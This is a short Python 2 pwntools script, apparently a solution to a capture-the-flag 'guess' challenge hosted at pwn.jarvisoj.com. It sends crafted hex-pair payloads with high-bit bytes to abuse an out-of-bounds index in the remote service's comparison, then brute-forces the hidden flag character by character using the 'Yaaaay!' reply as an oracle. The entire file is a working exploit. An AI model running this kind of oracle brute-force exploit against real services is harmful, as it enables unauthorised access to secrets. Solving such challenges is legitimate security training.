from pwn import *
import string

# context.log_level = 'debug'

sh = remote('pwn.jarvisoj.com', 9878)

payload = ""
for i in range(50):
    payload += "0" + chr(0x40 + 128 + i)

sh.recvuntil("guess> ")

shellcode = list(payload)
flag = ""
for i in range(50):
    for j in string.printable:
        shellcode[2 * i]  = j.encode('hex')[0]
        shellcode[2 * i + 1] = j.encode('hex')[1]
        sh.sendline("".join(shellcode))
        print "".join(str(i) for i in shellcode)

        ans = sh.recvline()
        print ans

        if ('Yaaaay!' in ans) == 1:
            flag += j
            break

print flag

sh.close()